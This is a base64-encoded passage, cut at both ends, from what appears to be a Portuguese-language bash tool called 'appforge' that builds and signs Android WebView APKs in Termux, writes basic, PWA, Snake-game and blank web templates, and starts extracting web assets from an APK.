x0SW5ab29tQ29udHJvbHMoZmFsc2UpOyBzLnNldERpc3BsYXlab29tQ29udHJvbHMoZmFsc2UpOwogICAgICAgIHMuc2V0VXNlV2lkZVZpZXdQb3J0KHRydWUpOyBzLnNldExvYWRXaXRoT3ZlcnZpZXdNb2RlKHRydWUpOwogICAgICAgIHcuc2V0V2ViVmlld0NsaWVudChuZXcgV2ViVmlld0NsaWVudCgpKTsKICAgICAgICB3LmxvYWRVcmwoIiRKQVZBX0xPQUQiKTsKICAgIH0KICAgIEBPdmVycmlkZSBwdWJsaWMgdm9pZCBvbkJhY2tQcmVzc2VkKCkgeyBpZiAody5jYW5Hb0JhY2soKSkgdy5nb0JhY2soKTsgZWxzZSBzdXBlci5vbkJhY2tQcmVzc2VkKCk7IH0KICAgIEBPdmVycmlkZSBwcm90ZWN0ZWQgdm9pZCBvblJlc3VtZSgpIHsgc3VwZXIub25SZXN1bWUoKTsgdy5vblJlc3VtZSgpOyB9CiAgICBAT3ZlcnJpZGUgcHJvdGVjdGVkIHZvaWQgb25QYXVzZSgpICB7IHN1cGVyLm9uUGF1c2UoKTsgIHcub25QYXVzZSgpOyAgfQp9CkpBVkFFT0YKICBfaW5mbyAnYWFwdDIgY29tcGlsZS4uLicKICBhYXB0MiBjb21waWxlIC0tZGlyICIkQlVJTEQvcmVzIiAtbyAiJEJVSUxEL3Jlc19jb21waWxlZC8iIDI+JjEgfCBncmVwIC12ICdeJCcgfCB3aGlsZSBJRlM9IHJlYWQgLXIgbDsgZG8gX2RpbSAiJGwiOyBkb25lCiAgX2luZm8gJ2FhcHQyIGxpbmsuLi4nCiAgYWFwdDIgbGluayAtLW1hbmlmZXN0ICIkQlVJTEQvQW5kcm9pZE1hbmlmZXN0LnhtbCIgLUkgIiRXMkFfSkFSIiAtQSAiJEJVSUxEL2Fzc2V0cyIgXAogICAgIiRCVUlMRC9yZXNfY29tcGlsZWQvIiouZmxhdCAtbyAiJEJVSUxEL3Vuc2lnbmVkLmFwayIgMj4mMSB8IGdyZXAgLXYgJ14kJyB8IHdoaWxlIElGUz0gcmVhZCAtciBsOyBkbyBfZGltICIkbCI7IGRvbmUKICBbIC1mICIkQlVJTEQvdW5zaWduZWQuYXBrIiBdIHx8IF9lcnIgJ2FhcHQyIGxpbmsgZmFsaG91JwogIF9pbmZvICdDb21waWxhbmRvIEphdmEuLi4nCiAgbG9jYWwgSkFWQV9DT01QSUxFUgogIGlmIGNvbW1hbmQgLXYgZWNqID4vZGV2L251bGwgMj4mMTsgdGhlbiBKQVZBX0NPTVBJTEVSPSdlY2onCiAgZWxpZiBjb21tYW5kIC12IGphdmFjID4vZGV2L251bGwgMj4mMTsgdGhlbiBKQVZBX0NPTVBJTEVSPSdqYXZhYycKICBlbHNlIF9lcnIgJ0NvbXBpbGFkb3IgSmF2YSBuYW8gZW5jb250cmFkby4gSW5zdGFsZTogcGtnIGluc3RhbGwgZWNqJzsgZmkKICBfZGltICJVc2FuZG86ICRKQVZBX0NPTVBJTEVSIgogIGlmIFsgIiRKQVZBX0NPTVBJTEVSIiA9ICdlY2onIF07IHRoZW4KICAgIGVjaiAtc291cmNlIDcgLXRhcmdldCA3IC1jcCAiJFcyQV9KQVIiICIkQlVJTEQvc3JjLyRQS0dfUEFUSC9XZWJBY3Rpdml0eS5qYXZhIiBcCiAgICAgIC1kICIkQlVJTEQvY2xhc3Nlcy8iIDI+JjEgfCBncmVwIC12ICdeJCcgfCB3aGlsZSBJRlM9IHJlYWQgLXIgbDsgZG8gX2RpbSAiJGwiOyBkb25lCiAgZWxzZQogICAgamF2YWMgLXNvdXJjZSA3IC10YXJnZXQgNyAtY3AgIiRXMkFfSkFSIiAiJEJVSUxEL3NyYy8kUEtHX1BBVEgvV2ViQWN0aXZpdHkuamF2YSIgXAogICAgICAtZCAiJEJVSUxEL2NsYXNzZXMvIiAyPiYxIHwgZ3JlcCAtdiAnXiQnIHwgd2hpbGUgSUZTPSByZWFkIC1yIGw7IGRvIF9kaW0gIiRsIjsgZG9uZQogIGZpCiAgWyAtZiAiJEJVSUxEL2NsYXNzZXMvJFBLR19QQVRIL1dlYkFjdGl2aXR5LmNsYXNzIiBdIHx8IF9lcnIgJ2NvbXBpbGFjYW8gSmF2YSBmYWxob3UnCiAgX2luZm8gJ2R4ICguY2xhc3MgLT4gLmRleCkuLi4nCiAgZHggLS1kZXggLS1vdXRwdXQ9IiRCVUlMRC9jbGFzc2VzLmRleCIgIiRCVUlMRC9jbGFzc2VzLyIgMj4mMSB8IGdyZXAgLXYgJ14kJyB8IHdoaWxlIElGUz0gcmVhZCAtciBsOyBkbyBfZGltICIkbCI7IGRvbmUKICBbIC1mICIkQlVJTEQvY2xhc3Nlcy5kZXgiIF0gfHwgX2VyciAnZHggZmFsaG91JwogIF9pbmZvICdFbXBhY290YW5kbyBERVguLi4nCiAgKGNkICIkQlVJTEQiICYmIHppcCAtaiB1bnNpZ25lZC5hcGsgY2xhc3Nlcy5kZXgpID4gL2Rldi9udWxsCiAgX2luZm8gJ3ppcGFsaWduLi4uJwogIHppcGFsaWduIC1mIDQgIiRCVUlMRC91bnNpZ25lZC5hcGsiICIkQlVJTEQvYWxpZ25lZC5hcGsiIDI+L2Rldi9udWxsCiAgX2Vuc3VyZV9rZXlzdG9yZQogIGxvY2FsIEtTX0FMSUFTIEtTX1BBU1MKICBpZiBbICIkVzJBX0tTIiA9ICIkSE9NRS8ueHBtL3Rvb2xzL2Fwa3Rvb2wveHBtLWNvbXBhdC10ZXN0LmtleXN0b3JlIiBdOyB0aGVuCiAgICBLU19BTElBUz0neHBtLWNvbXBhdC10ZXN0JzsgS1NfUEFTUz0neHBtLWNvbXBhdC10ZXN0JwogIGVsc2UgS1NfQUxJQVM9J2FwcGZvcmdlJzsgS1NfUEFTUz0nYXBwZm9yZ2Uta2V5JzsgZmkKICBfaW5mbyAnYXBrc2lnbmVyLi4uJwogIGFwa3NpZ25lciBzaWduIC0ta3MgIiRXMkFfS1MiIC0ta3Mta2V5LWFsaWFzICIkS1NfQUxJQVMiIFwKICAgIC0ta3MtcGFzcyBwYXNzOiIkS1NfUEFTUyIgLS1rZXktcGFzcyBwYXNzOiIkS1NfUEFTUyIgXAogICAgLS1vdXQgIiRPVVRfQVBLIiAiJEJVSUxEL2FsaWduZWQuYXBrIiAyPiYxIHwgZ3JlcCAtdiAnXiQnIHwgd2hpbGUgSUZTPSByZWFkIC1yIGw7IGRvIF9kaW0gIiRsIjsgZG9uZQogIFsgLWYgIiRPVVRfQVBLIiBdIHx8IF9lcnIgJ2Fwa3NpZ25lciBmYWxob3UnCiAgbG9jYWwgQVBLX1NJWkU7IEFQS19TSVpFPSQoZHUgLWggIiRPVVRfQVBLIiB8IGN1dCAtZjEpCiAgcHJpbnRmICdcblwwMzNbMTszMm0gID09IEFQSyBwcm9udG8gPT1cMDMzWzBtXG5cbicKICBfb2sgIkFycXVpdm8gIDogJE9VVF9BUEsgKCRBUEtfU0laRSkiCiAgX29rICJQYWNrYWdlICA6ICRQS0dfTkFNRSIKICBfb2sgIlZlcnNhbyAgIDogJFZFUlNJT05fTkFNRSAoJFZFUlNJT05fQ09ERSkiCiAgcHJpbnRmICdcbic7IF9kaW0gIkluc3RhbGFyIDogdGVybXV4LW9wZW4gJyRPVVRfQVBLJyI7IHByaW50ZiAnXG4nCn0KX2NtZF90ZW1wbGF0ZSgpIHsKICBsb2NhbCBUVFlQRT0iJHsxOi19IiBPVVRESVI9IiR7MjotfSIKICBpZiBbIC16ICIkVFRZUEUiIF07IHRoZW4KICAgIHByaW50ZiAiXG5cMDMzWzE7MzVtICBhcHBmb3JnZSB0ZW1wbGF0ZVwwMzNbMG1cblxuIgogICAgcHJpbnRmICIgIFwwMzNbMTszMm0xKVwwMzNbMG0gYmFzaWMgIDIpIHB3YSAgMykgZ2FtZSAgNCkgYmxhbmtcblxuIgogICAgcHJpbnRmICIgIFRpcG8gWzEtNCBvdSBub21lXTogIgogICAgSUZTPSByZWFkIC1yIFRUWVBFIDwvZGV2L3R0eQogICAgY2FzZSAiJFRUWVBFIiBpbiAxKSBUVFlQRT0iYmFzaWMiOzsgMikgVFRZUEU9InB3YSI7OyAzKSBUVFlQRT0iZ2FtZSI7OyA0KSBUVFlQRT0iYmxhbmsiOzsgZXNhYwogIGZpCiAgWyAteiAiJE9VVERJUiIgXSAmJiBPVVRESVI9Ii4vJHtUVFlQRX1hcHAiCiAgbWtkaXIgLXAgIiRPVVRESVIiCiAgY2FzZSAiJFRUWVBFIiBpbgogICAgYmFzaWMpIF90cGxfYmFzaWMgIiRPVVRESVIiOzsgcHdhKSBfdHBsX3B3YSAiJE9VVERJUiI7OwogICAgZ2FtZSkgX3RwbF9nYW1lICIkT1VURElSIjs7IGJsYW5rKSBfdHBsX2JsYW5rICIkT1VURElSIjs7CiAgICAqKSBwcmludGYgIlwwMzNbMTszMW0gIFRlbXBsYXRlIGRlc2NvbmhlY2lkbzogJXNcMDMzWzBtXG4iICIkVFRZUEUiOyBleGl0IDE7OwogIGVzYWMKICBwcmludGYgIlxuXDAzM1sxOzMybSAgUHJvamV0byBjcmlhZG8gZW06ICVzXDAzM1swbVxuIiAiJE9VVERJUiIKICBwcmludGYgIlwwMzNbMDs5MG0gIEJ1aWxkOiBhcHBmb3JnZSBidWlsZCAnJXMnIC0tbmFtZSBcIiVzXCJcMDMzWzBtXG5cbiIgIiRPVVRESVIiICIkVFRZUEUiCn0KX3RwbF9iYXNpYygpIHsKICBsb2NhbCBEPSIkMSIKICBjYXQgPiAiJEQvaW5kZXguaHRtbCIgPDwgJ0hUTUwnCjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJwdC1CUiI+CjxoZWFkPgogIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCwgdXNlci1zY2FsYWJsZT1ubyI+CiAgPHRpdGxlPk1ldSBBcHA8L3RpdGxlPgogIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0ic3R5bGUuY3NzIj4KPC9oZWFkPgo8Ym9keT4KICA8aGVhZGVyPjxoMT5NZXUgQXBwPC9oMT48L2hlYWRlcj4KICA8bWFpbj4KICAgIDxkaXYgY2xhc3M9ImNhcmQiPgogICAgICA8cD5UZW1wbGF0ZSBiw6FzaWNvIGRvIDxzdHJvbmc+YXBwZm9yZ2U8L3N0cm9uZz4uPC9wPgogICAgICA8cD5DbGlxdWVzOiA8c3BhbiBpZD0iY291bnQiPjA8L3NwYW4+PC9wPgogICAgICA8YnV0dG9uIGlkPSJidG4iPkNsaXF1ZSBhcXVpPC9idXR0b24+CiAgICA8L2Rpdj4KICA8L21haW4+CiAgPHNjcmlwdCBzcmM9InNjcmlwdC5qcyI+PC9zY3JpcHQ+CjwvYm9keT4KPC9odG1sPgpIVE1MCiAgY2F0ID4gIiREL3N0eWxlLmNzcyIgPDwgJ0NTUycKOnJvb3R7LS1iZzojMGYxMTE3Oy0tc3VyZmFjZTojMWExZDI3Oy0tYWNjZW50OiMxYTczZTg7LS10ZXh0OiNlOGVhZjA7LS1tdXRlZDojOGE4ZmE4fQoqe2JveC1zaXppbmc6Ym9yZGVyLWJveDttYXJnaW46MDtwYWRkaW5nOjB9CmJvZHl7YmFja2dyb3VuZDp2YXIoLS1iZyk7Y29sb3I6dmFyKC0tdGV4dCk7Zm9udC1mYW1pbHk6c3lzdGVtLXVpLHNhbnMtc2VyaWY7bWluLWhlaWdodDoxMDB2aDtkaXNwbGF5OmZsZXg7ZmxleC1kaXJlY3Rpb246Y29sdW1ufQpoZWFkZXJ7YmFja2dyb3VuZDp2YXIoLS1zdXJmYWNlKTtwYWRkaW5nOjE4cHggMjBweDt0ZXh0LWFsaWduOmNlbnRlcjtib3JkZXItYm90dG9tOjFweCBzb2xpZCAjMmEyZDNhfQpoZWFkZXIgaDF7Zm9udC1zaXplOjEuNHJlbTtjb2xvcjp2YXIoLS1hY2NlbnQpfQptYWlue2ZsZXg6MTtwYWRkaW5nOjIwcHg7bWF4LXdpZHRoOjUwMHB4O21hcmdpbjowIGF1dG87d2lkdGg6MTAwJX0KLmNhcmR7YmFja2dyb3VuZDp2YXIoLS1zdXJmYWNlKTtib3JkZXItcmFkaXVzOjE0cHg7cGFkZGluZzoyMHB4O2JvcmRlcjoxcHggc29saWQgIzJhMmQzYTttYXJnaW4tdG9wOjE2cHh9Ci5jYXJkIHB7Y29sb3I6dmFyKC0tbXV0ZWQpO2xpbmUtaGVpZ2h0OjEuNjttYXJnaW4tYm90dG9tOjEwcHh9CiNjb3VudHtjb2xvcjp2YXIoLS1hY2NlbnQpO2ZvbnQtd2VpZ2h0OmJvbGR9CmJ1dHRvbnttYXJnaW4tdG9wOjEycHg7YmFja2dyb3VuZDp2YXIoLS1hY2NlbnQpO2NvbG9yOiNmZmY7Ym9yZGVyOm5vbmU7Ym9yZGVyLXJhZGl1czoxMHB4O3BhZGRpbmc6MTJweCAyOHB4O2ZvbnQtc2l6ZToxcmVtO2N1cnNvcjpwb2ludGVyO3dpZHRoOjEwMCV9CmJ1dHRvbjphY3RpdmV7b3BhY2l0eTouNzV9CkNTUwogIGNhdCA+ICIkRC9zY3JpcHQuanMiIDw8ICdKUycKJ3VzZSBzdHJpY3QnOwpsZXQgbj0wOwpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYnRuJykuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCgpPT57CiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2NvdW50JykudGV4dENvbnRlbnQ9KytuOwp9KTsKSlMKfQpfdHBsX3B3YSgpIHsKICBsb2NhbCBEPSIkMSI7IF90cGxfYmFzaWMgIiREIgogIHNlZCAtaSAnc3w8L2hlYWQ+fCAgPGxpbmsgcmVsPSJtYW5pZmVzdCIgaHJlZj0ibWFuaWZlc3QuanNvbiI+XG48L2hlYWQ+fCcgIiREL2luZGV4Lmh0bWwiCiAgc2VkIC1pICdzfDwvYm9keT58ICA8c2NyaXB0PmlmKCJzZXJ2aWNlV29ya2VyImluIG5hdmlnYXRvciluYXZpZ2F0b3Iuc2VydmljZVdvcmtlci5yZWdpc3Rlcigic3cuanMiKTwvc2NyaXB0PlxuPC9ib2R5PnwnICIkRC9pbmRleC5odG1sIgogIHByaW50ZiAneyJuYW1lIjoiTWV1IFBXQSIsInNob3J0X25hbWUiOiJQV0EiLCJzdGFydF91cmwiOiIuIiwiZGlzcGxheSI6InN0YW5kYWxvbmUiLCJiYWNrZ3JvdW5kX2NvbG9yIjoiIzBmMTExNyIsInRoZW1lX2NvbG9yIjoiIzFhNzNlOCJ9XG4nID4gIiREL21hbmlmZXN0Lmpzb24iCiAgY2F0ID4gIiREL3N3LmpzIiA8PCAnU1cnCmNvbnN0IEM9J3B3YS12MScsQT1bJy8nLCcvaW5kZXguaHRtbCcsJy9zdHlsZS5jc3MnLCcvc2NyaXB0LmpzJ107CnNlbGYuYWRkRXZlbnRMaXN0ZW5lcignaW5zdGFsbCcsZT0+ZS53YWl0VW50aWwoY2FjaGVzLm9wZW4oQykudGhlbihjPT5jLmFkZEFsbChBKSkpKTsKc2VsZi5hZGRFdmVudExpc3RlbmVyKCdmZXRjaCcsZT0+ZS5yZXNwb25kV2l0aChjYWNoZXMubWF0Y2goZS5yZXF1ZXN0KS50aGVuKHI9PnJ8fGZldGNoKGUucmVxdWVzdCkpKSk7ClNXCn0KX3RwbF9nYW1lKCkgewogIGxvY2FsIEQ9IiQxIgogIGNhdCA+ICIkRC9pbmRleC5odG1sIiA8PCAnSFRNTCcKPCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9InB0LUJSIj4KPGhlYWQ+CiAgPG1ldGEgY2hhcnNldD0iVVRGLTgiPgogIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wLCB1c2VyLXNjYWxhYmxlPW5vIj4KICA8dGl0bGU+U25ha2U8L3RpdGxlPgogIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0ic3R5bGUuY3NzIj4KPC9oZWFkPgo8Ym9keT4KICA8aDE+8J+QjSBTbmFrZTwvaDE+CiAgPGNhbnZhcyBpZD0iYyIgd2lkdGg9IjMwMCIgaGVpZ2h0PSIzMDAiPjwvY2FudmFzPgogIDxwIGlkPSJzY29yZSI+UG9udG9zOiAwPC9wPgogIDxkaXYgaWQ9ImRwYWQiPgogICAgPGJ1dHRvbiBkYXRhLWQ9IlVQIj7ilrI8L2J1dHRvbj4KICAgIDxkaXY+PGJ1dHRvbiBkYXRhLWQ9IkxFRlQiPuKXgDwvYnV0dG9uPjxidXR0b24gZGF0YS1kPSJSSUdIVCI+4pa2PC9idXR0b24+PC9kaXY+CiAgICA8YnV0dG9uIGRhdGEtZD0iRE9XTiI+4pa8PC9idXR0b24+CiAgPC9kaXY+CiAgPHNjcmlwdCBzcmM9InNjcmlwdC5qcyI+PC9zY3JpcHQ+CjwvYm9keT4KPC9odG1sPgpIVE1MCiAgY2F0ID4gIiREL3N0eWxlLmNzcyIgPDwgJ0NTUycKKntib3gtc2l6aW5nOmJvcmRlci1ib3g7bWFyZ2luOjA7cGFkZGluZzowfWJvZHl7YmFja2dyb3VuZDojMGYxMTE3O2NvbG9yOiNlOGVhZjA7Zm9udC1mYW1pbHk6c3lzdGVtLXVpLHNhbnMtc2VyaWY7ZGlzcGxheTpmbGV4O2ZsZXgtZGlyZWN0aW9uOmNvbHVtbjthbGlnbi1pdGVtczpjZW50ZXI7cGFkZGluZzoyMHB4IDEwcHg7Z2FwOjEycHg7bWluLWhlaWdodDoxMDB2aH1oMXtmb250LXNpemU6MS41cmVtO2NvbG9yOiMxYTczZTh9Y2FudmFze2JvcmRlcjoycHggc29saWQgIzFhNzNlODtib3JkZXItcmFkaXVzOjhweDt0b3VjaC1hY3Rpb246bm9uZX0jc2NvcmV7Y29sb3I6IzhhOGZhOH0jZHBhZHtkaXNwbGF5OmZsZXg7ZmxleC1kaXJlY3Rpb246Y29sdW1uO2FsaWduLWl0ZW1zOmNlbnRlcjtnYXA6NnB4fSNkcGFkIGRpdntkaXNwbGF5OmZsZXg7Z2FwOjZweH0jZHBhZCBidXR0b257YmFja2dyb3VuZDojMWExZDI3O2JvcmRlcjoxcHggc29saWQgIzJhMmQzYTtib3JkZXItcmFkaXVzOjEwcHg7Y29sb3I6I2U4ZWFmMDtmb250LXNpemU6MS40cmVtO3dpZHRoOjU2cHg7aGVpZ2h0OjU2cHg7Y3Vyc29yOnBvaW50ZXJ9I2RwYWQgYnV0dG9uOmFjdGl2ZXtiYWNrZ3JvdW5kOiMxYTczZTh9CkNTUwogIGNhdCA+ICIkRC9zY3JpcHQuanMiIDw8ICdKUycKJ3VzZSBzdHJpY3QnOwpjb25zdCBjYW52YXM9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2MnKSxjdHg9Y2FudmFzLmdldENvbnRleHQoJzJkJyksU1o9MTUsQ09MUz0yMCxST1dTPTIwOwpsZXQgc25ha2UsZGlyLGZvb2Qsc2NvcmUscnVubmluZyxsb29wOwpmdW5jdGlvbiBpbml0KCl7c25ha2U9W3t4OjUseToxMH0se3g6NCx5OjEwfSx7eDozLHk6MTB9XTtkaXI9e3g6MSx5OjB9O2Zvb2Q9cm5kKCk7c2NvcmU9MDtydW5uaW5nPXRydWU7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Njb3JlJykudGV4dENvbnRlbnQ9J1BvbnRvczogMCc7Y2xlYXJJbnRlcnZhbChsb29wKTtsb29wPXNldEludGVydmFsKHRpY2ssMTMwKTt9CmZ1bmN0aW9uIHJuZCgpe3JldHVybnt4Ok1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSpDT0xTKSx5Ok1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSpST1dTKX07fQpmdW5jdGlvbiB0aWNrKCl7Y29uc3QgaD17eDpzbmFrZVswXS54K2Rpci54LHk6c25ha2VbMF0ueStkaXIueX07aWYoaC54PDB8fGgueD49Q09MU3x8aC55PDB8fGgueT49Uk9XU3x8c25ha2Uuc29tZShzPT5zLng9PT1oLngmJnMueT09PWgueSkpe2NsZWFySW50ZXJ2YWwobG9vcCk7cnVubmluZz1mYWxzZTtjdHguZmlsbFN0eWxlPSdyZ2JhKDAsMCwwLC42KSc7Y3R4LmZpbGxSZWN0KDAsMCwzMDAsMzAwKTtjdHguZmlsbFN0eWxlPScjZmZmJztjdHguZm9udD0nYm9sZCAyNHB4IHN5c3RlbS11aSc7Y3R4LnRleHRBbGlnbj0nY2VudGVyJztjdHguZmlsbFRleHQoJ0dhbWUgT3ZlcicsMTUwLDEzNSk7Y3R4LmZvbnQ9JzE2cHggc3lzdGVtLXVpJztjdHguZmlsbFRleHQoJ1RvcXVlIHBhcmEgcmVpbmljaWFyJywxNTAsMTY1KTtyZXR1cm47fXNuYWtlLnVuc2hpZnQoaCk7aWYoaC54PT09Zm9vZC54JiZoLnk9PT1mb29kLnkpe3Njb3JlKys7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Njb3JlJykudGV4dENvbnRlbnQ9J1BvbnRvczogJytzY29yZTtmb29kPXJuZCgpO31lbHNlIHNuYWtlLnBvcCgpO2RyYXcoKTt9CmZ1bmN0aW9uIGRyYXcoKXtjdHguZmlsbFN0eWxlPScjMGYxMTE3JztjdHguZmlsbFJlY3QoMCwwLDMwMCwzMDApO2N0eC5maWxsU3R5bGU9JyMxYTczZTgnO3NuYWtlLmZvckVhY2goKHMsaSk9PntjdHguZ2xvYmFsQWxwaGE9aT09PTA/MTowLjc7cnIocy54KlNaKzEscy55KlNaKzEsU1otMixTWi0yLDMpO30pO2N0eC5nbG9iYWxBbHBoYT0xO2N0eC5maWxsU3R5bGU9JyNlNTM5MzUnO3JyKGZvb2QueCpTWisxLGZvb2QueSpTWisxLFNaLTIsU1otMiwzKTt9CmZ1bmN0aW9uIHJyKHgseSx3LGgscil7Y3R4LmJlZ2luUGF0aCgpO2N0eC5yb3VuZFJlY3QoeCx5LHcsaCxyKTtjdHguZmlsbCgpO30KZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigna2V5ZG93bicsZT0+e2NvbnN0IG09e0Fycm93VXA6e3g6MCx5Oi0xfSxBcnJvd0Rvd246e3g6MCx5OjF9LEFycm93TGVmdDp7eDotMSx5OjB9LEFycm93UmlnaHQ6e3g6MSx5OjB9fTtpZihtW2Uua2V5XSYmIShtW2Uua2V5XS54PT09LWRpci54JiZtW2Uua2V5XS55PT09LWRpci55KSlkaXI9bVtlLmtleV07fSk7CmRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJyNkcGFkIGJ1dHRvbicpLmZvckVhY2goYj0+e2IuYWRkRXZlbnRMaXN0ZW5lcigndG91Y2hzdGFydCcsZT0+e2UucHJldmVudERlZmF1bHQoKTtpZighcnVubmluZyl7aW5pdCgpO3JldHVybjt9Y29uc3QgbT17VVA6e3g6MCx5Oi0xfSxET1dOOnt4OjAseToxfSxMRUZUOnt4Oi0xLHk6MH0sUklHSFQ6e3g6MSx5OjB9fTtjb25zdCBkPW1bYi5kYXRhc2V0LmRdO2lmKGQmJiEoZC54PT09LWRpci54JiZkLnk9PT0tZGlyLnkpKWRpcj1kO30pO30pOwpjYW52YXMuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCgpPT57aWYoIXJ1bm5pbmcpaW5pdCgpO30pOwppbml0KCk7CkpTCn0KX3RwbF9ibGFuaygpIHsKICBsb2NhbCBEPSIkMSIKICBjYXQgPiAiJEQvaW5kZXguaHRtbCIgPDwgJ0hUTUwnCjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJwdC1CUiI+CjxoZWFkPgogIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCwgdXNlci1zY2FsYWJsZT1ubyI+CiAgPHRpdGxlPk1ldSBBcHA8L3RpdGxlPgogIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0ic3R5bGUuY3NzIj4KPC9oZWFkPgo8Ym9keT4KICA8c2NyaXB0IHNyYz0ic2NyaXB0LmpzIj48L3NjcmlwdD4KPC9ib2R5Pgo8L2h0bWw+CkhUTUwKICBwcmludGYgJyp7Ym94LXNpemluZzpib3JkZXItYm94O21hcmdpbjowO3BhZGRpbmc6MH1cbmJvZHl7Zm9udC1mYW1pbHk6c3lzdGVtLXVpLHNhbnMtc2VyaWY7YmFja2dyb3VuZDojZmZmO2NvbG9yOiMxMTE7bWluLWhlaWdodDoxMDB2aH1cbicgPiAiJEQvc3R5bGUuY3NzIgogIHByaW50ZiAnInVzZSBzdHJpY3QiO1xuLy8gU2V1IGPDs2RpZ28gYXF1aVxuJyA+ICIkRC9zY3JpcHQuanMiCn0KX2NtZF9tYW4oKSB7CiAgcHJpbnRmICdcblwwMzNbMTszNW0gIGFwcGZvcmdlIOKAlCBNYW51YWwgcsOhcGlkb1wwMzNbMG1cblxuJwogIHByaW50ZiAnICBpbmRleC5odG1sIERFVkUgdGVyOiA8IURPQ1RZUEUgaHRtbD4sIDxtZXRhIGNoYXJzZXQ+LCA8bWV0YSB2aWV3cG9ydD5cbicKICBwcmludGYgJyAgPHNjcmlwdD4gU0VNUFJFIGFudGVzIGRlIDwvYm9keT4uIENhbWluaG9zIFNFTVBSRSByZWxhdGl2b3MuXG5cbicKfQpfY21kX2FwazJ3ZWIoKSB7CiAgbG9jYWwgQVBLX0ZJTEU9JycgT1VUX0RJUj0nJyBGT1JDRT0wCiAgd2hpbGUgWyAkIyAtZ3QgMCBdOyBkbwogICAgY2FzZSAiJDEiIGluIC0tZm9yY2V8LWYpIEZPUkNFPTE7IHNoaWZ0OzsgLS1vdXQpIE9VVF9ESVI9IiQyIjsgc2hpZnQgMjs7IC0tKikgX3dhcm4gIk9wY2FvIGRlc2NvbmhlY2lkYTogJDEiOyBzaGlmdDs7ICopIFsgLXogIiRBUEtfRklMRSIgXSAmJiBBUEtfRklMRT0iJDEiIHx8IE9VVF9ESVI9IiQxIjsgc2hpZnQ7OyBlc2FjCiAgZG9uZQogIFsgLXogIiRBUEtfRklMRSIgXSAmJiB7IF9jbWRfaGVscDsgZXhpdCAxOyB9CiAgWyAtZiAiJEFQS19GSUxFIiBdIHx8IF9lcnIgIkFQSyBuYW8gZW5jb250cmFkbzogJEFQS19GSUxFIgogIHB5dGhvbjMgLWMgImltcG9ydCB6aXBmaWxlOyB6aXBmaWxlLlppcEZpbGUoJyRBUEtfRklMRScpIiAyPi9kZXYvbnVsbCB8fCBfZXJyICJBcnF1aXZvIGludmFsaWRvOiAkQVBLX0ZJTEUiCiAgWyAteiAiJE9VVF9ESVIiIF0gJiYgT1VUX0RJUj0iLi8kKGJhc2VuYW1lICIkQVBLX0ZJTEUiIC5hcGspX3dlYiIKICBpZiBbIC1kICIkT1VUX0RJUiIgXSAmJiBbICIkRk9SQ0UiIC1lcSAwIF07IHRoZW4KICAgIHByaW50ZiAnXDAzM1sxOzMzbSAgIiVzIiBqYSBleGlzdGUuIFNvYnJlc2NyZXZlcj8gW3MvTl0gXDAzM1swbScgIiRPVVRfRElSIgogICAgSUZTPSByZWFkIC1yIF9yIDwvZGV2L3R0eQogICAgY2FzZSAiJF9yIiBpbiBzfFN8eXxZKSA6OzsgKikgcHJpbnRmICcgIENhbmNlbGFkby5cblxuJzsgZXhpdCAwOzsgZXNhYwogIGZpCiAgX2hlYWQgJ2FwcGZvcmdlIGFwazJ3ZWInOyBfaW5mbyAiQVBLOiAkQVBLX0ZJTEUiOyBfaW5mbyAiU2FpZGE6ICRPVVRfRElSIgogIG1rZGlyIC1wICIkT1VUX0RJUiI7IF9pbmZvICdFeHRyYWluZG8uLi4nCiAgcHl0aG9uMyAtICIkQVBLX0ZJTEUiICIkT1VUX0RJUiIgPDwgJ1BZRU9GJwppbXBvcnQgc3lzLG9zLHppcGZpbGUKYXBrLG91dD1zeXMuYXJndlsxXSxzeXMuYXJndlsyXQpXRT17Jy5odG1sJywnLmh0bScsJy5jc3MnLCcuanMnLCcuanNvbicsJy5zdmcnLCcueG1sJywnLnBuZycsJy5qcGcnLCcuanBlZycsJy5naWYnLCcud2VicCcsJy5pY28nLCcudHRmJywnLndvZmYnLCcud29mZjInLCcub3RmJywnLm1wMycsJy5vZ2cnLCcud2F2JywnLnR4dCcsJy5tZCd9CmM9eydodG1sJzowLCdjc3MnOjAsJ2pzJzowLCdvdGhlcic6MH0Kd2l0aCB6aXBmaWxlLlppcEZpbGUoYXBrLCdyJykgYXMgemY6CiAgICBlbnRyaWVzPXpmLm5hbWVsaXN0KCkKICAgIHBmeD0nYXNzZXRzL3d3dy8nCiAgICB3ZT1bZSBmb3IgZSBpbiBlbnRyaWVzIGlmIGUuc3RhcnRzd2l0aChwZngpIGFuZCBub3QgZS5lbmRzd2l0aCgnLycpXQogICAgaWYgbm90IHdlOiBwZng9J2Fzc2V0cy8nOyB3ZT1bZSBmb3IgZSBpbiBlbnRyaWVzIGlmIGUuc3RhcnRzd2l0aChwZngpIGFuZCBub3QgZS5lbmRzd2l0aCgnLycpXQogICAgd2U9W2UgZm9yIGUgaW4gd2UgaWYgb3MucGF0aC5zcGxpdGV4dChlLmxvd2VyKCkpW